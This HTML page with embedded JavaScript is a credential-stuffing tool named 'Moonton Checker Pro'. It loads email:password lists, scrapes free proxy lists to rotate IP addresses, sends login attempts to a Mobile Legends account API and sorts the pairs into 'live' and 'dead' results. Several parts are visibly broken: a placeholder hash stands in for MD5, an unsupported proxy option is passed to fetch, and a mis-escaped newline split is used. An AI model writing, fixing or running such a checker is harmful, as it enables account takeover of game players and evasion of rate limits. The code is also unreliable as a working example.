<!DOCTYPE html>
<html>
<head>
    <title>Moonton Checker Pro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: #0f0f1a; 
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 900px; margin: 0 auto; }
        h1 { text-align: center; color: #6366f1; margin-bottom: 20px; }
        
        .card {
            background: #1a1a2e;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .card h2 {
            color: #6366f1;
            margin-bottom: 15px;
            font-size: 16px;
        }
        
        textarea {
            width: 100%;
            height: 150px;
            background: #242442;
            border: 1px solid #3f3f5a;
            border-radius: 8px;
            color: #e0e0e0;
            padding: 10px;
            font-family: monospace;
        }
        
        .row { display: flex; gap: 10px; margin-bottom: 15px; }
        .col { flex: 1; }
        
        label { display: block; margin-bottom: 5px; font-size: 14px; }
        input, select {
            width: 100%;
            padding: 10px;
            background: #242442;
            border: 1px solid #3f3f5a;
            border-radius: 8px;
            color: #e0e0e0;
        }
        
        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
        }
        .btn-primary { background: #6366f1; color: white; }
        .btn-success { background: #22c55e; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-warning { background: #f59e0b; color: black; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .btn-group { display: flex; gap: 10px; margin-bottom: 15px; }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            text-align: center;
        }
        .stat-box {
            background: #242442;
            padding: 15px;
            border-radius: 8px;
        }
        .stat-value { font-size: 24px; font-weight: bold; }
        .stat-label { font-size: 12px; opacity: 0.7; }
        .live .stat-value { color: #22c55e; }
        .dead .stat-value { color: #ef4444; }
        
        .progress {
            height: 8px;
            background: #242442;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }
        .progress-bar {
            height: 100%;
            background: #6366f1;
            transition: width 0.3s;
        }
        
        .checkbox {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 8px;
        }
        .checkbox input { width: auto; }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            background: #242442;
            border-radius: 8px;
            margin-top: 15px;
            font-size: 13px;
        }
        
        .result-box {
            background: #242442;
            padding: 10px;
            border-radius: 8px;
            max-height: 300px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
        }
        .result-item { padding: 5px 0; border-bottom: 1px solid #3f3f5a; }
        .live-item { color: #22c55e; }
        .dead-item { color: #ef4444; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚔️ Moonton Checker Pro</h1>
        
        <!-- Proxy Section -->
        <div class="card">
            <h2>🌐 Proxy Settings</h2>
            <div class="row">
                <div class="col">
                    <label>Loaded Proxies</label>
                    <input type="text" id="proxyCount" value="0" readonly>
                </div>
            </div>
            <div class="checkbox">
                <input type="checkbox" id="useProxy">
                <label>Use Proxies</label>
            </div>
            <div class="checkbox">
                <input type="checkbox" id="autoRescrape" checked>
                <label>Auto Rescrape when exhausted</label>
            </div>
            <div class="btn-group">
                <button class="btn btn-warning" id="scrapeBtn" onclick="scrapeProxies()">🕷️ Start Scrape</button>
            </div>
            <div id="proxyStatus" class="status-bar">
                <span>Click Start Scrape to begin</span>
            </div>
        </div>
        
        <!-- Account Input -->
        <div class="card">
            <h2>📝 Accounts (email:password or email|password)</h2>
            <textarea id="accounts" placeholder="test@test.com:password123&#10;test2@test2.com:password456"></textarea>
            <div class="row" style="margin-top: 15px;">
                <div class="col">
                    <label>Threads</label>
                    <input type="number" id="threads" value="20">
                </div>
            </div>
        </div>
        
        <!-- Controls -->
        <div class="btn-group">
            <button class="btn btn-success" id="startBtn" onclick="startCheck()">▶ Start Checking</button>
            <button class="btn btn-danger" id="stopBtn" onclick="stopCheck()" disabled>■ Stop</button>
        </div>
        
        <!-- Progress -->
        <div class="card">
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value" id="totalCount">0</div>
                    <div class="stat-label">Total</div>
                </div>
                <div class="stat-box live">
                    <div class="stat-value" id="liveCount">0</div>
                    <div class="stat-label">Live</div>
                </div>
                <div class="stat-box dead">
                    <div class="stat-value" id="deadCount">0</div>
                    <div class="stat-label">Dead</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statusText">Ready</div>
                    <div class="stat-label">Status</div>
                </div>
            </div>
            <div class="progress">
                <div class="progress-bar" id="progressBar" style="width: 0%"></div>
            </div>
        </div>
        
        <!-- Results -->
        <div class="card">
            <h2>✓ Live Results</h2>
            <div id="liveResults" class="result-box"></div>
        </div>
        
        <div class="card">
            <h2>✗ Dead Results</h2>
            <div id="deadResults" class="result-box"></div>
        </div>
    </div>
    
    <script>
        let checking = false;
        
        function log(msg) {
            document.getElementById('proxyStatus').innerHTML = '<span>' + msg + '</span>';
        }
        
        // === PROXY SCRAPER ===
        const PROXY_SOURCES = [
            'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000',
            'https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
        ];
        
        let proxies = [];
        
        async function scrapeProxies() {
            const btn = document.getElementById('scrapeBtn');
            btn.disabled = true;
            btn.innerHTML = '🕷️ Scraping...';
            log('Scraping proxies...');
            
            proxies = [];
            
            for (const url of PROXY_SOURCES) {
                try {
                    const r = await fetch(url);
                    const text = await r.text();
                    const lines = text.split('\\n');
                    
                    for (const line of lines) {
                        const line2 = line.trim();
                        if (line2.includes(':') && line2.split(':').length === 2) {
                            const parts = line2.split(':');
                            const port = parseInt(parts[1]);
                            if (!isNaN(port) && port > 0 && port < 65536) {
                                proxies.push(line2);
                            }
                        }
                    }
                } catch (e) {
                    console.log('Error:', e);
                }
            }
            
            // Dedupe
            proxies = [...new Set(proxies)];
            
            document.getElementById('proxyCount').value = proxies.length;
            document.getElementById('useProxy').checked = true;
            
            btn.disabled = false;
            btn.innerHTML = '🕷️ Start Scrape';
            log('Scraped ' + proxies.length + ' proxies');
            
            if (proxies.length > 0) {
                document.getElementById('useProxy').checked = true;
            }
        }
        
        function getProxy(index) {
            if (!proxies.length) return null;
            return proxies[index % proxies.length];
        }
        
        // === CHECKER ===
        const API_URL = 'https://accountmtapi.mobilelegends.com/';
        
        function md5(str) {
            // Simple hash for demo - in real use you'd use a proper md5
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(16);
        }
        
        function buildParams(email, pw) {
            const md5pwd = md5(pw);
            const sign = 'account=' + email + '&md5pwd=' + md5pwd + '&op=login';
            const signHash = md5(sign);
            
            return JSON.stringify({
                'op': 'login',
                'sign': signHash,
                'params': {'account': email, 'md5pwd': md5pwd},
                'lang': 'cn'
            });
        }
        
        async function checkAccount(email, pw, proxy, useProxy) {
            try {
                const data = buildParams(email, pw);
                
                const opts = {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0'
                    },
                    body: data,
                    signal: AbortSignal.timeout(15000)
                };
                
                if (useProxy && proxy) {
                    opts.proxy = 'http://' + proxy;
                }
                
                const r = await fetch(API_URL, opts);
                return r.ok;
            } catch (e) {
                console.log('Error:', e);
                return false;
            }
        }
        
        async function startCheck() {
            const accounts = document.getElementById('accounts').value.trim();
            if (!accounts) {
                alert('Please enter accounts');
                return;
            }
            
            const useProxy = document.getElementById('useProxy').checked;
            const autoRescrape = document.getElementById('autoRescrape').checked;
            const threads = parseInt(document.getElementById('threads').value);
            
            // Parse accounts
            const accList = [];
            for (const line of accounts.split('\\n')) {
                const line2 = line.trim();
                if (!line2 || line2.startsWith('#')) continue;
                if (line2.includes('|')) {
                    const parts = line2.split('|');
                    if (parts.length >= 2) accList.push([parts[0], parts[1]]);
                } else if (line2.includes(':')) {
                    const parts = line2.split(':');
                    if (parts.length >= 2) accList.push([parts[0], parts[1]]);
                }
            }
            
            if (!accList.length) {
                alert('No valid accounts');
                return;
            }
            
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            checking = true;
            
            const live = [];
            const dead = [];
            let checked = 0;
            let proxyIndex = 0;
            
            log('Checking ' + accList.length + ' accounts...');
            
            for (const [email, pw] of accList) {
                if (!checking) break;
                
                if (useProxy && autoRescrape && proxyIndex >= proxies.length) {
                    // Auto rescrape
                    await scrapeProxies();
                    proxyIndex = 0;
                }
                
                const proxy = getProxy(proxyIndex);
                proxyIndex++;
                
                const isLive = await checkAccount(email, pw, proxy, useProxy);
                checked++;
                
                if (isLive) {
                    live.push(email + ':' + pw);
                } else {
                    dead.push(email + ':' + pw);
                }
                
                // Update UI
                document.getElementById('totalCount').textContent = accList.length;
                document.getElementById('liveCount').textContent = live.length;
                document.getElementById('deadCount').textContent = dead.length;
                const percent = (checked / accList.length) * 100;
                document.getElementById('progressBar').style.width = percent + '%';
            }
            
            // Results
            document.getElementById('liveResults').innerHTML = 
                live.map(x => '<div class="result-item live-item">' + x + '</div>').join('');
            document.getElementById('deadResults').innerHTML = 
                dead.map(x => '<div class="result-item dead-item">' + x + '</div>').join('');
            
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            checking = false;
            
            log('Done! Live: ' + live.length + ', Dead: ' + dead.length);
        }
        
        function stopCheck() {
            checking = false;
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            log('Stopped');
        }
    </script>
</body>
</html>
